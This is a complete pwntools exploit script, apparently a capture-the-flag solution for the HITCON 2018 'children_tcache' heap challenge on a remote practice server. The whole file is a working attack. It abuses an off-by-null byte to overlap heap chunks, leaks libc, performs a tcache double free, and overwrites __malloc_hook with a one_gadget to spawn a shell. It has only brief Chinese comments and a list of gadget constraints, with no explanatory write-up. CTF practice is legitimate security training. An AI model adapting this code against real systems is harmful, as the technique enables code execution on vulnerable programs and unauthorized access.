from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node4.buuoj.cn",29088)
# io=process("./HITCON_2018_children_tcache")
elf=ELF("./HITCON_2018_children_tcache")
libc=ELF("./libc-2.27.so")

def add(n,c):
    io.sendlineafter(b"Your choice: ",b"1")
    io.sendlineafter(b"Size:",str(n))
    io.sendafter(b"Data:",c)

def show(n):
    io.sendlineafter(b"Your choice: ",b"2")
    io.sendlineafter(b"Index:",str(n))

def delete(n):
    io.sendlineafter(b"Your choice: ",b"3")
    io.sendlineafter(b"Index:",str(n))

add(0x440,b"aaa") #0
add(0x68,b"ccc") #1
add(0x4f0,b"ddd") #2
add(0x10,b"bbb") #3

delete(0)
delete(1)

for i in range(8):
    add(0x68-i,b"a"*(0x68-i)) #将逐字节更改直到最后1字节
    delete(0)  #下标空闲即可取

add(0x68,cyclic(0x60)+p64(0x4c0)) #0
delete(2)

add(0x440,b"sss") #1
show(0)

leak_addr=u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
libc_addr=leak_addr-0x60-0x3EBC40
malloc_hook=libc_addr+libc.sym[b"__malloc_hook"]
free_hook=libc_addr+libc.sym[b"__free_hook"]
one_gadget=[0x4f2a5,0x4f302,0x10a2fc]
print("libc_addr: "+hex(libc_addr))

shell=one_gadget[1]+libc_addr


add(0x68,b"eee") #2  0,2堆块重叠

delete(0) #main_arena->0
delete(2) #main_arena->2->0    double free

# gdb.attach(io)
# pause()

add(0x68,p64(malloc_hook))
add(0x68,p64(malloc_hook))
add(0x68,p64(shell))

io.sendlineafter(b"Your choice: ",b"1")
io.sendlineafter(b"Size:",b"1")



io.interactive() 


# 0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f302 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
